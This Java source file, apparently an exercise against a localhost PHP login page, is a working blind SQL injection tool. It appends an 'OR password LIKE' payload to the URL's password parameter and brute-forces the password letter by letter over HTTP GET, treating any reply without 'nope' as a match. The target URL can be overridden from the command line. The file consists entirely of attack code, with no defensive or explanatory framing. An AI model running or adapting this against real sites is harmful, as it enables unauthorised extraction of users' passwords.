package com.company;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

public class SQLInject {

    public static void main(String[] args) {
        String baseURL = "http://localhost:1212/osc/request.php?username=request&password=somepassword";
        if(args.length > 0){
            baseURL = args[0];
        }
        String prepared = prepareUrl(baseURL);
        System.out.println(injectWebsite(prepared,8));
    }

    /**
     * Prepares URL for SQL Injection
     * @param baseUrl - Base url
     * @return Prepared Url
     */
    private static String prepareUrl(String baseUrl){
        return baseUrl.substring(0,baseUrl.lastIndexOf("password=")+9)+"%27OR%20password%20LIKE%20%27REPLACE%25";
    }

    /**
     *
     * @param baseUrl - Website with password params at the end
     * @param passwordLength - Known length of password
     * @return - Password returned or error
     */
    private static String injectWebsite(String baseUrl,int passwordLength){
        char[] alphabet = "abcdefghijklmnopqrstuvwxyz".toCharArray();
        StringBuilder password = new StringBuilder();
        for (int i = 0;i < passwordLength;i++){
            //Generate string for placeholder
            String placeholder = "";
            for (int j = 0;j < passwordLength;j++){
                placeholder += (i == j) ? "REPLACE" : "_";
            }
            //Insert the placeholder into the baseUrl
            String url = baseUrl.replace("REPLACE",placeholder);
            for (int k = 0;k < alphabet.length;k++){
                String urlWithParams = url.replace("REPLACE",String.valueOf(alphabet[k]));
                String response = readData(urlWithParams);
                //Assumption: If doesn't contain Nope, the response has been successful
                if(!response.toLowerCase().contains("nope") && response.length() > 0){
                    //Valid Letter returned
                    password.append(alphabet[k]);
                }
            }
        }
        password = (password.length() == 0) ? new StringBuilder("Error: Password not found") : password;
        return password.toString();
    }

    private static String readData(String urlName){
        try{
            StringBuffer buffer = new StringBuffer();
            URL url = new URL(urlName);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("GET");
            connection.setDoInput(true);
            connection.connect();
            BufferedReader in;
            in = new BufferedReader( new InputStreamReader(connection.getInputStream()));
            String inputLine = in.readLine();
            while(inputLine != null){
                buffer.append(inputLine);
                inputLine = in.readLine();
            }
            in.close();
            connection.disconnect();
            return buffer.toString();
        }catch (IOException e){
            System.out.println("Returned a HTTP 404 ERROR "+urlName);
        }
        return "";
    }
}
